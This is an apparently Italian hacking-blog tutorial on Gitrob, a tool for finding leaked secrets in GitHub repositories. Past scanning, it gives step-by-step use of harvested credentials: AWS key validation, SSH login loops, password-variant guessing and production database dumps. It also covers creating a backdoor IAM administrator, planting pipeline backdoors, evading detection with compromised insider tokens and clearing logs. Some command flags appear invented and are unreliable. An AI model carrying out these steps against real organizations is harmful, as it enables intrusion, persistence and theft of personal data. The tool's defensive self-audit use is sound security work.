---
title: 'Gitrob: OSINT e Secret Discovery su Repository GitHub'
slug: gitrob
description: Gitrob analizza repository GitHub per individuare file sensibili e credenziali esposte. Strumento utile in fase di reconnaissance e secret hunting.
image: /Gemini_Generated_Image_l2qx4fl2qx4fl2qx.webp
draft: true
date: 2026-02-13T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - recon
tags:
  - github-enumeration
---

Gitrob è un tool specializzato nel **scanning di repository Git** (GitHub, GitLab, Bitbucket) per identificare file potenzialmente sensibili, credenziali hardcoded, API keys, e altri segreti. Developers spesso committano accidentalmente password, chiavi private SSH, AWS credentials, e database dumps nei repository - Gitrob automatizza il processo di discovery di questi leaks.

Il tool funziona clonando/analizzando tutti i repository di una GitHub organization o user, applicando pattern matching e signature detection per identificare file interessanti. A differenza di manual `git clone` + `grep`, Gitrob ha database di signatures per common secrets ([AWS](https://hackita.it/articoli/aws-privilege) keys, private keys, config files) e genera report web interattivi con findings categorizzati per severity.

Gitrob è critico in security assessments dove target ha presenza GitHub pubblica. Organizations con hundreds di repository, multiple team, e migliaia di commits possono involontariamente esporre secrets. Un singolo leaked AWS key può compromise entire cloud infrastructure. Bug bounty hunters usano Gitrob per quick wins: trovare exposed credentials è spesso reportable vulnerability.

Il tool analizza non solo files attuali ma anche **commit history**: secrets cancellati ma ancora presenti in old commits sono equally exploitable. Integra con GitHub API per automated discovery e supporta authenticated scanning per repository privati (se hai access token).

In questo articolo imparerai come usare Gitrob per comprehensive GitHub reconnaissance, pattern matching avanzato per custom secrets, automated scanning di large organizations, e exploitation di found credentials. Vedrai scenari reali dove leaked GitHub secrets hanno portato a full infrastructure compromise.

Gitrob si posiziona nella kill chain in **Reconnaissance → OSINT** e **Initial Access → Credential Harvesting**.

***

## 1️⃣ Setup e Installazione

### Requisiti

```bash
# Go 1.16+
go version

# Git
git --version

# GitHub Personal Access Token
# Generate: https://github.com/settings/tokens
# Permissions: repo, read:org
```

### Installazione

```bash
# Install via go get
go install github.com/michenriksen/gitrob@latest

# Verifica
gitrob --version
# Gitrob v2.0.0-beta
```

**Alternative: Docker**

```bash
# Pull image
docker pull michenriksen/gitrob

# Run
docker run --rm michenriksen/gitrob --help
```

### GitHub Token configuration

```bash
# Set environment variable
export GITROB_ACCESS_TOKEN="ghp_xxxxxxxxxxxxxxxxxxxx"

# Or pass via flag
gitrob -github-access-token ghp_xxxx [org]
```

**Token permissions required:**

* `repo` (se vuoi scan private repos)
* `read:org` (per organization enumeration)
* `public_repo` (minimo per public repos)

***

## 2️⃣ Uso Base

### Scan organization

```bash
gitrob acmecorp
```

**Output:**

```
[*] Gitrob v2.0.0-beta starting...
[*] GitHub Token: ghp_****...****
[*] Target: acmecorp (organization)

[*] Gathering organization members...
[+] Found 47 members

[*] Gathering organization repositories...
[+] Found 156 repositories

[*] Cloning repositories...
[+] acmecorp/website (15.2 MB)
[+] acmecorp/api-backend (8.7 MB)
[+] acmecorp/mobile-app (12.3 MB)
[... 153 more]

[*] Analyzing files for secrets...
[!] HIGH: AWS Access Key found
    File: acmecorp/api-backend/config/aws.js
    Pattern: AKIA[0-9A-Z]{16}
    Key: AKIAIOSFODNN7EXAMPLE
    
[!] HIGH: Private SSH Key found
    File: acmecorp/ops-scripts/deploy/id_rsa
    Content: -----BEGIN RSA PRIVATE KEY-----
    
[!] MEDIUM: Database credentials
    File: acmecorp/website/.env
    Content: DB_PASSWORD=SuperSecret123

[*] Web interface starting on http://127.0.0.1:9393
```

**Web UI:**

```bash
# Open browser
firefox http://127.0.0.1:9393

# UI mostra:
# - Summary (findings count per severity)
# - Repository list
# - Files grouped by pattern type
# - Commit history per file
# - Direct GitHub links
```

### Scan single user

```bash
gitrob johndev
```

**Use case:** Target user specifico (ex-employee, contractor, developer persona).

### Scan specific repository

```bash
gitrob -repo acmecorp/sensitive-project
```

### Output options

```bash
# JSON output
gitrob acmecorp -json output.json

# CSV report
gitrob acmecorp -csv findings.csv

# No web interface (headless)
gitrob acmecorp -no-server
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: AWS credentials in public repository

**COMANDO:**

```bash
gitrob techstartup -threads 10 -commit-depth 500
```

**Flags:**

* `-threads 10`: Parallel cloning (faster)
* `-commit-depth 500`: Analizza ultimi 500 commits per repo

**OUTPUT ATTESO:**

```
[!] HIGH SEVERITY FINDINGS

Repository: techstartup/infrastructure
File: terraform/aws_keys.tf
Commit: a3f2b9c (2025-12-10)
Author: devops@techstartup.com
Pattern: AWS Access Key

Content:
  provider "aws" {
    access_key = "AKIAI44QH8DHBEXAMPLE"
    secret_key = "je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY"
    region     = "us-east-1"
  }
```

**Exploitation:**

```bash
# Test credentials
export AWS_ACCESS_KEY_ID="AKIAI44QH8DHBEXAMPLE"
export AWS_SECRET_ACCESS_KEY="je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY"

aws sts get-caller-identity
# {
#   "UserId": "AIDAI...",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/terraform-deployer"
# }

# Enumerate permissions
aws iam get-user
aws ec2 describe-instances
aws s3 ls
# [40 buckets listed]

# Full AWS account access!
```

**COSA FARE SE FALLISCE:**

1. **Credentials expired/rotated:** Keys in old commits spesso sono revoked. Check commit date - recent commits (\<30 days) = higher chance active.
2. **Rate limited by GitHub API:** Reduce `-threads` o attendi reset (60 requests/hour free tier).
3. **Organization ha troppi repos:** Use `-repo` flag per target specific high-value repos.

**Timeline:** 20 minuti scan + 5 minuti credential validation + exploitation

***

### Scenario 2: Private SSH keys in commit history

**COMANDO:**

```bash
gitrob consultingfirm -save-secrets ./secrets/
```

**Flag:** `-save-secrets`: Salva found secrets in directory locale.

**OUTPUT ATTESO:**

```
[!] HIGH: SSH Private Key
Repository: consultingfirm/client-projects
File: deployment/keys/client-prod.pem
Commit: 89d3f21 (deleted in 7a2b1f3 but still in history)

[*] Secret saved to: ./secrets/client-prod.pem
```

**Exploitation:**

```bash
# Found key salvato localmente
chmod 600 ./secrets/client-prod.pem

# Test against known client infrastructure
# (from OSINT/subdomain enum)
ssh -i ./secrets/client-prod.pem ubuntu@client-prod-server.com
# ubuntu@prod-server:~$

# Or test on common AWS/Azure/GCP usernames
for user in ubuntu ec2-user admin root; do
  ssh -i ./secrets/client-prod.pem -o ConnectTimeout=3 $user@target-ip && echo "[+] $user works"
done
```

**COSA FARE SE FALLISCE:**

* **Key has passphrase:** Try crack con `ssh2john` + `john` se passphrase is weak.
* **Key doesn't match any server:** Potrebbe essere development key o rotated. Document finding anyway (security issue).
* **Connection refused:** Server potrebbe essere down o IP changed. Try other IPs from organization OSINT.

**Timeline:** 15 minuti scan + 30 minuti SSH testing against known infrastructure

Per approfondire SSH key exploitation, consulta [lateral movement via compromised SSH keys](https://hackita.it/articoli/ssh).

***

### Scenario 3: Database dumps con PII

**COMANDO:**

```bash
gitrob healthcareapp -signatures custom-patterns.json
```

**custom-patterns.json:**

```json
{
  "signatures": [
    {
      "part": "filename",
      "match": "dump|backup|export",
      "description": "Database backup files"
    },
    {
      "part": "extension",
      "match": "sql|db|sqlite",
      "description": "Database files"
    },
    {
      "part": "content",
      "match": "INSERT INTO users",
      "description": "User data SQL"
    }
  ]
}
```

**OUTPUT ATTESO:**

```
[!] CRITICAL: Database Dump with PII
Repository: healthcareapp/legacy-migration
File: backups/prod-users-2025.sql
Size: 450 MB
Commit: f8e3a12 (2025-11-20)

Preview:
INSERT INTO patients VALUES (1,'John','Doe','555-0123','john@example.com','Heart Disease');
INSERT INTO patients VALUES (2,'Jane','Smith','555-0124','jane@example.com','Diabetes');
[... 150,000 more records]
```

**Exploitation (Ethical Disclosure):**

```bash
# DO NOT download/exfiltrate PII data
# Verify existence only

# Clone repo to confirm
git clone https://github.com/healthcareapp/legacy-migration
cd legacy-migration
git checkout f8e3a12

# Count records
wc -l backups/prod-users-2025.sql
# 150,247 backups/prod-users-2025.sql

# Report to organization IMMEDIATELY
# This is GDPR/HIPAA violation - critical
```

**Timeline:** 10 minuti discovery → Immediate responsible disclosure

***

## 4️⃣ Tecniche Avanzate

### Custom signature patterns

Gitrob ha default patterns, ma puoi add custom per organization-specific secrets.

```json
{
  "signatures": [
    {
      "part": "filename",
      "match": "company-internal|confidential",
      "description": "Internal/confidential files"
    },
    {
      "part": "content",
      "match": "api[_-]key[\"']?\\s*[:=]\\s*[\"']?[a-zA-Z0-9]{32}",
      "description": "API keys (32 char)"
    },
    {
      "part": "extension",
      "match": "p12|pfx|jks",
      "description": "Certificate stores"
    }
  ]
}
```

**Usage:**

```bash
gitrob acmecorp -signatures custom-patterns.json
```

### Historical commit analysis

```bash
# Deep history scan (all commits)
gitrob acmecorp -commit-depth 0

# Specific time range
gitrob acmecorp -commit-since 2024-01-01 -commit-until 2024-12-31
```

**Use case:** Ex-employee left company in 2024. Scan loro commits per leaked secrets.

### Multi-organization scanning

```bash
#!/bin/bash
# scan_multiple_orgs.sh

ORGS="company1 company2 company3"

for org in $ORGS; do
  echo "[*] Scanning $org"
  gitrob $org -no-server -json "results/$org.json"
done

# Aggregate results
jq -s 'add' results/*.json > consolidated.json
```

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Bug Bounty - GitHub organization reconnaissance

**COMANDO:**

```bash
gitrob bugcrowd-target -threads 20 -commit-depth 1000 -save-secrets ./findings/
```

**OUTPUT ATTESO:**

```
[*] Analyzing 89 repositories...

[!] HIGH PRIORITY FINDINGS:

1. Slack Webhook URL
   Repo: bugcrowd-target/internal-bot
   File: config/slack.yml
   URL: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX
   
2. Stripe API Key (test mode)
   Repo: bugcrowd-target/payment-service
   File: .env.example
   Key: sk_test_4eC39HqLyjWDarjtT1zdp7dc
   
3. GitHub Personal Access Token
   Repo: bugcrowd-target/automation
   File: scripts/deploy.sh
   Token: ghp_16CharacterTokenXXXXXXXXXXXX
```

**COSA FARE SE FALLISCE:**

* **No findings:** Organization ha good secret management. Report as positive.
* **Only low-severity findings:** Still document (shows potential for future leaks).
* **Private repos inaccessible:** Need insider access or leaked token for full assessment.

**Timeline:** 30 minuti scan + 1 ora verification + report write-up

***

### Scenario B: Red Team - Credential harvesting for initial access

**COMANDO:**

```bash
# Target: Former employee GitHub account
gitrob john-exemployee -save-secrets ./creds/ -commit-depth 0
```

**OUTPUT ATTESO:**

```
[!] Jenkins credentials
   Repo: john-exemployee/old-work-projects
   File: Jenkinsfile
   Commit: 3 years ago (never cleaned up)
   
   Content:
   withCredentials([
     usernamePassword(credentialsId: 'prod-deploy',
       usernameVariable: 'USER', passwordVariable: 'PASS')
   ]) {
     sh "ssh $USER@prod-jenkins.company.internal"
   }
   
   Hardcoded later in commit history:
   USER='jenkins-admin'
   PASS='J3nk!ns2023Prod'
```

**Exploitation:**

```bash
# Test credentials on company infrastructure
ssh jenkins-admin@prod-jenkins.company.internal
# Password: J3nk!ns2023Prod
# jenkins-admin@jenkins:~$

# Jenkins admin = code execution on all build agents
# Plant backdoor in build pipelines
```

**COSA FARE SE FALLISCE:**

* **User deleted all repos:** Check GitHub Archive, WayBack Machine, or cached versions.
* **Credentials rotated:** Try password variations (J3nk!ns2024Prod, J3nk!ns2025Prod).

**Timeline:** 15 minuti Gitrob scan + 10 minuti credential testing

***

### Scenario C: M\&A Due Diligence - Secret exposure assessment

**COMANDO:**

```bash
gitrob acquisition-target -json report.json -csv findings.csv
```

**OUTPUT ATTESO (JSON report):**

```json
{
  "organization": "acquisition-target",
  "scan_date": "2026-02-06",
  "repositories_scanned": 234,
  "findings": {
    "critical": 5,
    "high": 23,
    "medium": 67,
    "low": 145
  },
  "summary": {
    "aws_keys": 3,
    "private_keys": 8,
    "database_credentials": 12,
    "api_tokens": 45
  },
  "risk_score": 8.5
}
```

**Report per client:**

```
Security Assessment Summary:
- 234 repositories analyzed
- 240 potential secrets identified
- 5 CRITICAL findings requiring immediate action:
  * 3 active AWS credentials with admin access
  * 2 production database passwords
  
Estimated remediation cost: $50,000
Risk exposure: HIGH
Recommendation: Require full credential rotation before acquisition
```

**COSA FARE SE FALLISCE:**

* **Organization is private:** Need acquisition team to provide GitHub access or insider info.
* **Incomplete scan:** Request extended timeline or access to private repos.

**Timeline:** 2 ore comprehensive scan + 4 ore report generation

***

## 6️⃣ Toolchain Integration

### Pre-Gitrob: OSINT GitHub discovery

```bash
# Google dorking for GitHub presence
site:github.com "companyname"

# GitHub search API
curl -H "Authorization: token ghp_xxx" \
  "https://api.github.com/search/users?q=company+location:USA"

# Feed to Gitrob
gitrob [discovered-org]
```

### Gitrob → TruffleHog (deep scan)

```bash
# Gitrob identifies high-value repos
gitrob acmecorp -json findings.json

# Extract repo list
cat findings.json | jq -r '.repositories[].full_name' > repos.txt

# TruffleHog deep entropy scan
while read repo; do
  trufflehog github --repo="https://github.com/$repo"
done < repos.txt
```

### Gitrob → Credential validation pipeline

```bash
#!/bin/bash
# auto_validate.sh

# Run Gitrob
gitrob target -json findings.json

# Extract AWS keys
cat findings.json | jq -r '.findings[] | select(.pattern=="AWS") | .content' > aws_keys.txt

# Test each key
while read key; do
  export AWS_ACCESS_KEY_ID=$(echo $key | cut -d: -f1)
  export AWS_SECRET_ACCESS_KEY=$(echo $key | cut -d: -f2)
  
  if aws sts get-caller-identity 2>/dev/null; then
    echo "[+] VALID: $AWS_ACCESS_KEY_ID"
  fi
done < aws_keys.txt
```

Per automation di secret scanning in CI/CD, leggi [automated secret detection in development pipelines](https://hackita.it/articoli/secret-scanning-automation).

### Comparazione tool

| **Tool**            | **Git Platforms**         | **Commit History** | **Custom Patterns** | **Web UI** | **Best For**                 |
| ------------------- | ------------------------- | ------------------ | ------------------- | ---------- | ---------------------------- |
| **Gitrob**          | GitHub, GitLab, Bitbucket | ✅ Yes              | ✅ Yes               | ✅ Yes      | Organization-wide assessment |
| **TruffleHog**      | All Git                   | ✅✅ Deep entropy    | ⚠️ Limited          | ❌ No       | Deep single-repo scan        |
| **GitLeaks**        | All Git                   | ✅ Yes              | ✅ Yes               | ❌ No       | CI/CD integration            |
| **Repo-supervisor** | GitHub                    | ⚠️ Shallow         | ✅ Yes               | ❌ No       | Python projects              |
| **git-secrets**     | All Git                   | ❌ Pre-commit only  | ✅ Yes               | ❌ No       | Prevention (pre-commit hook) |

**Quando usare Gitrob:**

* Multi-repo organization assessment
* Need visual web interface per non-technical stakeholders
* Bug bounty reconnaissance phase
* M\&A due diligence

***

## 7️⃣ Attack Chain Completa

### OSINT → GitHub Secrets → Cloud Infrastructure Takeover

**FASE 1: Target Identification**

```bash
# LinkedIn search: employees di target company
# Extract GitHub usernames from profiles

# Google dorking
site:github.com "target-company.com"
```

**Findings:** GitHub organization `target-corp` con 45 members, 180 repos.

**Timeline:** 30 minuti

***

**FASE 2: Gitrob Scan**

```bash
gitrob target-corp -commit-depth 0 -save-secrets ./secrets/
```

**Output:**

```
[!] AWS Credentials
   File: infra/terraform/main.tf
   Commit: 18 months ago
```

**Timeline:** 45 minuti

***

**FASE 3: Credential Validation**

```bash
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

aws sts get-caller-identity
# Arn: arn:aws:iam::123456789012:user/terraform-admin
```

**Timeline:** 5 minuti

***

**FASE 4: AWS Enumeration**

```bash
aws ec2 describe-instances --region us-east-1
# [20 EC2 instances found]

aws rds describe-db-instances
# [5 RDS databases found]

aws s3 ls
# [60 S3 buckets listed]
```

**Timeline:** 15 minuti

***

**FASE 5: Lateral Movement**

```bash
# EC2 instance metadata access
aws ec2 describe-instance-attribute --instance-id i-xxxxx --attribute userData
# UserData contains database password

# Connect to RDS
mysql -h prod-db.xxxxx.us-east-1.rds.amazonaws.com -u admin -p'[password-from-userdata]'
# mysql> ← Database access

# Dump production data
mysqldump --all-databases > prod_dump.sql
```

**Timeline:** 30 minuti

***

**FASE 6: Persistence**

```bash
# Create backdoor IAM user
aws iam create-user --user-name system-backup
aws iam create-access-key --user-name system-backup
aws iam attach-user-policy --user-name system-backup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Lambda backdoor
# [deploy persistence lambda function]
```

**Timeline:** 20 minuti

***

**TOTALE:** \~3 ore da OSINT a full AWS compromise con persistence.

**Ruolo Gitrob:** Single tool execution in 45 minuti identified 18-month-old AWS credentials in commit history che nessuno aveva remembered to rotate. Questo singolo finding = complete infrastructure takeover.

***

## 8️⃣ Detection & Evasion

### Cosa detecta Blue Team

**GitHub audit log (Organization level):**

```
Event: repository.clone
Actor: external_user
Repository: sensitive-repo
Timestamp: 2026-02-06 10:30:00
```

**Rate limiting alerts:**

```
GitHub API: Excessive requests from IP
Pattern: Cloning multiple repos rapidly
User-Agent: Go-http-client/1.1 (Gitrob signature)
```

**SIEM correlation:**

```
Alert: Mass repository access
Indicators:
- 50+ repos cloned in 10 minutes
- Sequential access pattern
- Automated tool user-agent
```

### Evasion techniques

**1. Request throttling**

```bash
# Slow down cloning
gitrob acmecorp -delay 30

# Random delays
gitrob acmecorp -random-delay 10-60
```

**2. Custom User-Agent**

```bash
# Appear as legit git client
gitrob acmecorp -user-agent "git/2.39.1"
```

**3. Authenticated scanning via compromised token**

```bash
# Use token from compromised insider account
# Appears as legitimate employee activity
export GITROB_ACCESS_TOKEN="ghp_[insider-token]"
gitrob acmecorp
```

**4. Distributed scanning**

```bash
# Split organization members across multiple IPs
gitrob user1 user2 user3 -github-access-token token1  # IP 1
gitrob user4 user5 user6 -github-access-token token2  # IP 2
```

### Cleanup

Gitrob clona repos locally. Cleanup sensitive:

```bash
# Remove cloned repositories
rm -rf ~/.gitrob/repositories/

# Remove saved secrets
shred -u -z secrets/*

# Clear logs
rm ~/.gitrob/gitrob.log
```

***

## 9️⃣ Performance & Scaling

### Single organization benchmark

**Small org (10 repos, 50 commits each):**

```bash
time gitrob small-startup
# real: 3m15s
# user: 1m30s
# sys: 0m45s
```

**Large org (500 repos, 1000 commits each):**

```bash
time gitrob enterprise-corp -threads 20
# real: 2h45m
# user: 45m
# sys: 15m
```

### Optimization strategies

```bash
# Skip large files (>10MB)
gitrob acmecorp -max-file-size 10485760

# Limit commit depth
gitrob acmecorp -commit-depth 100

# Increase threads (if bandwidth allows)
gitrob acmecorp -threads 50

# Target specific repos only
gitrob -repo acmecorp/high-value-project
```

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Command**                      | **Function**      | **Use Case**          |
| -------------------------------- | ----------------- | --------------------- |
| `gitrob [org]`                   | Scan organization | Basic assessment      |
| `gitrob [user]`                  | Scan user repos   | Target individual     |
| `gitrob -repo [org/repo]`        | Single repo       | Deep dive             |
| `gitrob [org] -commit-depth 0`   | Full history      | Historical secrets    |
| `gitrob [org] -save-secrets DIR` | Extract secrets   | Offline analysis      |
| `gitrob [org] -json file.json`   | JSON output       | Automation            |
| `gitrob [org] -signatures FILE`  | Custom patterns   | Organization-specific |

### Secret Pattern Detection Accuracy

| **Secret Type**           | **Detection Rate** | **False Positive Rate** | **Notes**                         |
| ------------------------- | ------------------ | ----------------------- | --------------------------------- |
| **AWS Keys**              | \~95%              | Low (2-3%)              | AKIA prefix is distinctive        |
| **SSH Private Keys**      | \~98%              | Very Low (\<1%)         | BEGIN PRIVATE KEY header          |
| **API Tokens**            | \~70%              | Medium (10-15%)         | Many formats, hard to distinguish |
| **Passwords (hardcoded)** | \~60%              | High (20-30%)           | Ambiguous patterns                |
| **Database Credentials**  | \~80%              | Medium (5-10%)          | Common keywords help              |

***

## 11️⃣ Troubleshooting

### GitHub API rate limit exceeded

**Errore:**

```
[!] Error: GitHub API rate limit exceeded
    Limit: 60 requests/hour (unauthenticated)
    Reset: 2026-02-06 11:30:00
```

**Fix:**

```bash
# Use authenticated token (5000 requests/hour)
export GITROB_ACCESS_TOKEN="ghp_xxxx"
gitrob acmecorp

# Or wait for rate limit reset
```

***

### Cloning fails for large repositories

**Errore:**

```
[!] Error cloning acmecorp/monorepo: repository too large (5.2 GB)
```

**Fix:**

```bash
# Skip large repos
gitrob acmecorp -max-repo-size 1000000000  # 1GB limit

# Or target small repos only
gitrob acmecorp -skip-repo "monorepo,large-data"
```

***

### False positives in findings

**Issue:** Many "passwords" are actually test data, examples, or fake credentials.

**Mitigation:**

```bash
# Add exclusion patterns
# custom-signatures.json:
{
  "exclude_patterns": [
    "example.com",
    "test_password",
    "your-api-key-here",
    "XXXXXXXXXX"
  ]
}

gitrob acmecorp -signatures custom-signatures.json
```

***

## 12️⃣ FAQ

**Q: Gitrob richiede GitHub token?**

A: **No** per public repos, ma rate limit è 60 requests/hour. **Strongly recommended** usare token (5000 req/h). Per private repos, token è **required**.

**Q: È legale scannare GitHub organizations pubbliche?**

A: **Grey area**. Public repos sono... public. Ma accessing trovate credenziali senza autorizzazione è **illegale**. Bug bounty = OK se in scope. Always responsible disclosure.

**Q: Gitrob funziona su GitLab/Bitbucket?**

A: **Yes**, ma meno tested. GitLab integration è sperimentale. Bitbucket requires custom token setup.

**Q: Quante organization hanno leaked secrets realmente?**

A: **\~20-30%** di organizations hanno almeno 1 leaked secret in commit history. Study di GitHub Security Lab (2025) found \~6000 secrets/hour committed to public repos.

**Q: Gitrob può scan private repositories?**

A: **Yes**, se hai GitHub token con `repo` scope access a quei private repos.

**Q: Come posso prevent secrets in miei repos?**

A: Use `git-secrets` (pre-commit hook), GitHub Advanced Security (secret scanning), environment variables invece di hardcoding, e periodic Gitrob self-audits.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**          | **Command**                                 |
| --------------------- | ------------------------------------------- |
| **Scan organization** | `gitrob [org-name]`                         |
| **Scan user**         | `gitrob [username]`                         |
| **Single repo**       | `gitrob -repo [org/repo]`                   |
| **Full history**      | `gitrob [org] -commit-depth 0`              |
| **Save secrets**      | `gitrob [org] -save-secrets ./output/`      |
| **JSON report**       | `gitrob [org] -json report.json`            |
| **Custom patterns**   | `gitrob [org] -signatures patterns.json`    |
| **Fast scan**         | `gitrob [org] -threads 20 -commit-depth 50` |
| **Headless**          | `gitrob [org] -no-server`                   |

***

## Perché è rilevante oggi (2026)

DevOps velocity increased: CI/CD pipelines auto-commit configuration changes. Developers work faster with less security review. GitHub Copilot/AI coding assistants sometimes suggest hardcoded credentials in examples. Organizations hanno hundreds/thousands di repos accumulated over years, many unmaintained. Single leaked AWS key = millions in damages (Capital One breach 2019). Gitrob automatizza audit che manualmente richiederebbe weeks.

***

## Differenza rispetto ad alternative

| **Tool**            | **Quando usare**                             | **Limiti**                                |
| ------------------- | -------------------------------------------- | ----------------------------------------- |
| **Gitrob**          | Organization-wide assessment, visual reports | GitHub-focused, less deep than TruffleHog |
| **TruffleHog**      | Deep entropy-based detection, single repo    | Slow on large orgs, no web UI             |
| **GitLeaks**        | CI/CD integration, pre-commit prevention     | Less comprehensive historical scan        |
| **Repo-supervisor** | Python-specific projects                     | Limited language support                  |

**Gitrob best quando:** Need quick assessment di entire GitHub organization, want visual report per stakeholders, external reconnaissance phase.

***

## Hardening / Mitigazione

**Per defenders:**

### GitHub Secret Scanning

* Abilita GitHub Advanced Security
* Rilevamento automatico di secret committati
* Alert per token e chiavi esposte
* Pattern matching per provider (AWS, Azure, ecc.)

### Pre-commit hooks (git-secrets / Talisman)

```bash
git secrets --install
git secrets --register-aws
```

### Self-audit periodico

```bash
# Scan mensile della propria organization
gitrob my-company -json monthly-audit.json
```

Rivedi i risultati e ruota immediatamente eventuali credenziali esposte.

1. **Credential rotation policy:** Rotate all credentials ogni 90 giorni, immediate rotation se leak suspected.
2. **Organization-wide training:** Developer education su secret management, use of secret managers (Vault, AWS Secrets Manager).

***

## OPSEC e Detection

**Noise level:** Medio-Basso. GitHub API usage è logged ma mass cloning potrebbe trigger alerts.

**Log footprint:**

* GitHub audit log: repository.clone events
* API rate limit logs (se excessive requests)
* Organization webhook events (if configured)

**Reduce visibility:**

* Use compromised insider token (appears legit)
* Throttle requests (`-delay`)
* Target specific repos invece of full org
* Distribute scanning temporalmente (oggi 50 repos, domani altri 50)

**Detection difficulty:** Medium. Distinguishing legitimate developer activity from reconnaissance è challenging senza behavioral baselines.

**GitHub detection capabilities (2026):** GitHub Advanced Security può detect unusual cloning patterns, ma many organizations non hanno questo enabled (cost).

***

## Disclaimer

Gitrob è tool per **security research e authorized penetration testing**. Scanning GitHub repositories public è generalmente legal, ma **accessing/using trovate credenziali senza autorizzazione è illegale** (CFAA, GDPR, equivalenti internazionali). Usa solo in:

* Bug bounty programs (in-scope organizations)
* Authorized security assessments con signed agreements
* Self-audits di propria organization
* Educational purposes in controlled environments

**Repository:** [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
